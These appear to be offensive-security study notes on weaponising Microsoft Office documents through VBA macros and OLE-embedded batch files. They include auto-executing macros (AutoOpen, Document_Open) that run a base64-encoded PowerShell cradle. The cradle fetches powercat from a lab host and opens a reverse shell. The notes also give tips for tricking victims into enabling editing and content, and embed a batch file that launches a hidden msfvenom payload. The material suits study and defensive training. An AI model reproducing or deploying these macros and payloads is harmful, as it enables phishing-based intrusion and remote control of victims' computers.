# Macros  
Series of commands and instructions that are grouped together to programmatically accomplish a task.  
- Often used to manage dynamic content and link docs w/ external content.  
- Can be written from scratch in Visual Basic for Applications (VBA)  
	- Fully functional scripting language w/ full access to ActiveX objects & the Windows Script Host (similar to JS in HTML Apps)  

# Preparing the Attack

Consider:
	As malicious macros attacks are well-known, email providers and spam filters often filter out MS Office docs by default.
	- Can't simply send the mal-doc as an attachment.
 
To deliver payload & increase chances the target opens the doc, we could use a pretext & provide the doc in another way (like download link)

## Mark of the Web
If MS Office doc is successfully delivered to the target via email or download link
- File is tagged w/ *Mark of the Web* (MOTW)
	- Will open in *Protected View*
		- Disables all editing and mod settings in the doc & blocks execution of macros or embedded objects.
		- When opened, will show a warning w/ the option to *Enable Editing* (disables Protected View)
	- Not added to files on FAT32 formatted devices
	- Possible to avoid by providing it in container formats (7zip, ISO, IMG, etc)

### To bypass
- Get user to click on the *Enable Editing* button
	- Ex: Blur rest of doc and instruct to click to "unlock" it
- Rely on other macro-enabled MS Office programs that lack Protected View
	- Ex: Microsoft Publisher
		- Less frequently installed

Worse, MS implemented an outright blocking of macros that can only be unlocked by checking *Unblock* under file properties.

# Leveraging MS Word Macros

Within MS Word (likely similar in Excel)  
- Choose VIEW ribbon > Select Macros  
- Type name for macro > Create  
- Doc must be saved as either **.docm** or **.doc** formats.
	- \*\**Avoid **.docx** format* as it cannot save macros without attaching a containing template.
		- This means that we can run macros within **.docx** files but we can't embed or save the macro in the document (it's not persistent)
- When creating Macro ensure you save in the doc & ***not*** in the templates
![](macro_creation.png)
  
Body of the macro is denoted by keywords _**Sub**_ and _**End Sub**_  
- Sub procedures are very similar to a Function in VBA  
	- Difference is Sub procedures can't be used in expressions as they don't return any values.  
- _**'**_ = Comments  

- Leverage *ActiveX Objects*, which provide access to underlying operating system commands.
	- This can be achieved with **WScript** through the Windows Script Host Shell object.
```vbscript
' Execute the macro automatically
Sub AutoOpen()
  
	MyMacro
  
End Sub

' Execute the macro when a new document is opened
Sub Document_Open()
  
	MyMacro
  
End Sub
  
Sub MyMacro()
  
	CreateObject("Wscript.Shell").Run "powershell"

End Sub
```
	- AutoOpen() & Document_Open() differ slightly, depending on how Microsoft Word and the document were opened.
	- Both cover special cases which the other one doesn't and therefore we use both. 
  
  
Save Macro, save doc, and reopen.    If PowerShell opens immediately, macro worked correctly.
- A security warning requests to Enable Content (& effectively run the macros within)  
-  IRL, if the victim doesn't click the _Enable Content_, the attack will fail. So they'll need to be sufficiently encouraged to do so.  
  
We'll use a base64-encoded PowerShell download cradle (declared as a *String*) to download **PowerCat** and start the reverse shell.
- As VBA has a 255-char limit for literal strings not those stored in variables, so we'll have to split the commands into multiple lines and concatenate them.  
 
Addition to macro (diff Lines 14 & 16):  
```vbscript
Sub AutoOpen()  
  
	MyMacro  
  
End Sub  
  
Sub Document_Open()  
  
	MyMacro  
  
End Sub  
  
	Sub MyMacro()
	'Declare variable to store our PowerShell download cradle and the command to create a reverse shell with PowerCat
	Dim Str As String  
  
	CreateObject("Wscript.Shell").Run Str  
  
End Sub
```


PowerShell cmd to 1: Download powercat and 2: create the reverse shell  
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167/powercat.ps1');powercat -c 192.168.45.167 -p 4444 -e powershell
```

Encode command.  In Kali, use **pwsh**:
```powershell
└─PS> $TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167/powercat.ps1');powercat -c 192.168.45.167 -p 4444 -e powershell"

└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)

└─PS> $EncodedText

```
  
Using a python script to split up the payload ^:  
```python
str = "powershell.exe -nop -w hidden -e <base64EncodedText>"  
  
n = 50  
  
for i in range(0, len(str), n):  
print "Str = Str + " + '"' + str[i:i+n] + '"'
```

 
Updated macro:  
```vbscript
Sub AutoOpen()  
  
	MyMacro  
  
End Sub  
  
Sub Document_Open()  
  
	MyMacro  
  
End Sub  
  
Sub MyMacro()  
	Dim Str As String  
  
	Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
	 Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
	 Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
	 Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
	 Str = Str + "ALgAxADYAOAAuADQANQAuADEANgA3AC8AcABvAHcAZQByAGMAY"
	 Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
	 Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA3ACAALQBwA"
	 Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
	 Str = Str + "A"  
  
	CreateObject("Wscript.Shell").Run "Str"  
  
End Sub
```

  

### Object Linking and Embedding

**OLE** allows for abusing MS Office's document-embedding feature.  
  
**DDE** - Dynamic Data Exhange  
- Allows for the ability to execute arbitrary apps from within Office docs.  
*Patched since Dec 2017  
  
_.bat_ files are an older (still fully functional) format - replaced by VB & PS   
  
First we create the batch script:  
	POC will be to launch a cmd prompt:  
```bash
echo START cmd.exe > launch.bat
```

  
Then insert into a doc:  
- Open Word > Create new doc  
- Insert ribbon > Click on object menu
![[doc-object.png]]

- Create from file > Choose script  
	- Check Display as icon  
	- Change icon...  
		- Navigate to a desired binary  
			- Ex: C\:\\Program Files\\Microsoft Office\\root\\Office 16\\EXCEL  
		- Rename icon
![[doc-fromfile.png]]
	- Batch file is then embedded in the Word doc  
	- Save doc  
  
Once the icon is double clicked & the security warning is accepted, the batch file is launched.   
  
For the real exploit, replace the **cmd.exe** with the **msfvenom** payload ^^  
```powershell
START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBd......
```

Once the batch file is update, you'll need to re-embed it in the doc.
